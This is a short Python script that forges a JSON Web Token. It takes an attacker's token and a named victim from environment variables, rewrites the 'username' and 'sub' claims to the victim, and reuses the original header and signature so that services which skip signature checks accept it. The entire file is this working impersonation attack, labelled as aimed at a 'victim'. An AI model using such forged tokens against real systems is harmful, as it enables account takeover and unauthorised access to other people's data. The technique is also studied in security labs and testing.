import os
import json
import base64

# Reads TOKEN_B and VICTIM_USER from environment variables.
# Prints a modified JWT payload using TOKEN_B's header/signature and victim claims.

token = os.environ["TOKEN_B"]
victim = os.environ["VICTIM_USER"]

header_b64, payload_b64, signature_b64 = token.split(".")
payload_b64 += "=" * (-len(payload_b64) % 4)
payload = json.loads(base64.urlsafe_b64decode(payload_b64.encode()))

payload["username"] = victim
payload["sub"] = victim

new_payload_b64 = base64.urlsafe_b64encode(
    json.dumps(payload, separators=(",", ":")).encode()
).rstrip(b"=").decode()

print(f"{header_b64}.{new_payload_b64}.{signature_b64}")
